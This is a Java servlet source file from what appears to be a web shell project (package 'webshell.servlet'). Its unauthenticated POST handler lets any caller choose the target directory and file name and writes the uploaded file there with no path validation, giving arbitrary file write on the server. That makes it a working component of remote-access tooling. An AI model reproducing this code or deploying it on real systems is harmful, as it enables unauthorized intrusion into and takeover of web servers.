package webshell.servlet;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;
import org.apache.commons.io.IOUtils;

@SuppressWarnings("serial")
public class UploadServlet extends HttpServlet {

	@Override
	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		DiskFileItemFactory factory = new DiskFileItemFactory();
		File repository = new File(System.getProperty("java.io.tmpdir"));
		factory.setRepository(repository);
		ServletFileUpload upload = new ServletFileUpload(factory);
		try {
			List<FileItem> items = upload.parseRequest(request);
			String uploadTo = null;
			FileItem uploadFile = null;
			for (FileItem item : items) {
				if ("uploadTo".equals(item.getFieldName())) {
					uploadTo = item.getString();
				} else if ("uploadFile".equals(item.getFieldName())) {
					uploadFile = item;
				}
			}
			File f = new File(uploadTo, uploadFile.getName());
			FileOutputStream fos = new FileOutputStream(f);
			try {
				IOUtils.copy(uploadFile.getInputStream(), fos);
			} finally {
				fos.close();
			}
		} catch (FileUploadException e) {
			throw new ServletException(e);
		}
		response.setStatus(HttpServletResponse.SC_OK);
		response.setCharacterEncoding("UTF-8");
		response.getWriter().write("success");
		response.flushBuffer();
	}

}
